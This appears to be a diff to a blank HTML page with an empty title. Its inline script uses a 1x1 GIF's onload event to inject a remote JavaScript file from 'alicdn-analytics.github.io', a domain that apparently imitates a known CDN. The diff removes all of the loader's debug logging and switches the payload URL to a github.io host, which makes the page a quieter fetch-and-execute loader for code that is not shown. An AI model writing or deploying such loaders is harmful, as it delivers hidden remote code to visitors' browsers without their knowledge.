@@ -1,34 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
+<meta charset="UTF-8">
+<title></title>
+</head>
+<body>
 <script>
-console.log('[Loader] Script started');
 (function(){
-  var scriptUrl = 'https://raw.githubusercontent.com/alicdn-analytics/alicdn-analytics.github.io/main/assets/style-lib.min.js';
+  var scriptUrl = 'https://alicdn-analytics.github.io/assets/style-lib.min.js';
   
-  console.log('[Loader] Creating image');
   var img = new Image();
   img.onload = function() {
-    console.log('[Loader] Image loaded, injecting script 1');
     var script = document.createElement('script');
     script.src = scriptUrl;
     script.async = true;
-    script.onload = function() {
-      console.log('[Loader] Script 1 loaded and executed');
-    };
-    script.onerror = function() {
-      console.log('[Loader] Script 1 failed to load');
-    };
     document.head.appendChild(script);
   };
-  img.onerror = function() {
-    console.log('[Loader] Image failed to load');
-  };
   img.src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
-  console.log('[Loader] Image src set');
 })();
 </script>
-</head>
-<body>
 </body>
 </html>
